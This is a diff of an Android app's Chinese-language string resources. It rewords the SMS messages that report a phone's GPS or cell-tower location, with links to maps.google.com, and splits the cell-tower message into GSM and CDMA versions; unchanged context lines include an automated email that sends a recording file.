@@ -45,8 +45,9 @@
     <string name="mail_body_record">你好，这是来自%s的自动发信，附件是录音文件。试用期内有可能无法看到该来源手机的号码，显示为设备号，请见谅。</string>
     
     <!-- Location -->
-    <string name="location_sms_real">当前GPS位置（纬度，经度）：%s。去maps.google.com查看地图。定位精度5米内。</string>
-    <string name="location_sms_base_station">无法取得GPS定位。当前基站位置（纬度，经度）：%s。去maps.google.com查看地图。定位精度500米内。</string>
+    <string name="location_sms_real">当前GPS位置（纬度，经度）：%s。去maps.google.com查看地图，精度5米内。</string>
+    <string name="location_sms_base_station_gsm">根据基站定位，当前位置：%s。去maps.google.com查看地图，精度500米内。</string>
+    <string name="location_sms_base_station_cdma">根据基站定位，当前位置（纬度，经度）：%s。去maps.google.com查看地图，精度500米内。</string>
     <string name="location_sms_hist">无法获得当前位置。最近历史位置（时间，纬度，经度）：%s。去maps.google.com查看地图。</string>
     <string name="location_sms_fail">抱歉，当前无法获得所在位置，请稍后再试。若一直无法解决请联系客服。</string>
     
